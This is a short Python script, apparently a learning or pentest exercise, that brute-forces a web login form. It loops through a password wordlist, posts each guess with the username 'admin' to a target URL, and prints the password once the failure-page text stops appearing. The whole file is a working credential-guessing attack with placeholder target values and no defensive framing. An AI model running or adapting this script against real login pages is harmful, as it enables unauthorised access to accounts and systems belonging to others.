#!/usr/bin/env python

import requests

target_url = ""
data_dic = {"username": "admin", "password": "", "Login": "submit"}

with open("password.list", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dic["password"] = word
        response = requests.post(target_url, data=data_dic)

        if b"[any_word_that is on failed page]" not in response.content:
            print(f"[+] Got the password --> {word}")
            exit()
print("[+] Reached end of line.")
